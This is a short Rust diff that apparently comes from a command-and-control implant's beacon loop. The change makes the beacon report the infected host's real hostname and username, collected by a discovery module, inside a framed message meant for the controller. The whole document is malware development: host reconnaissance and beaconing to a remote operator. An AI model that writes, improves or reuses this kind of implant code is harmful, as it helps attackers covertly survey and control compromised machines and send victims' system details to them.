@@ -272,7 +272,11 @@ pub fn run_beacon_loop(_initial_config: C2Config) -> !
             last_rekey = 0;
         }
 
-        let beacon_json = r#"{"id": "spectre", "hostname": "target", "username": "root"}"#;
+        let hostname = crate::modules::discovery::Discovery.get_hostname();
+        let username = crate::modules::discovery::Discovery.get_username();
+        // Simple JSON construction without allocations if possible, but we have alloc
+        let beacon_json = format!(r#"{{"id": "spectre", "hostname": "{}", "username": "{}"}}"#, hostname, username);
+        
         let frame = WraithFrame::new(FRAME_TYPE_DATA, beacon_json.as_bytes().to_vec());
         let frame_bytes = frame.serialize();
 
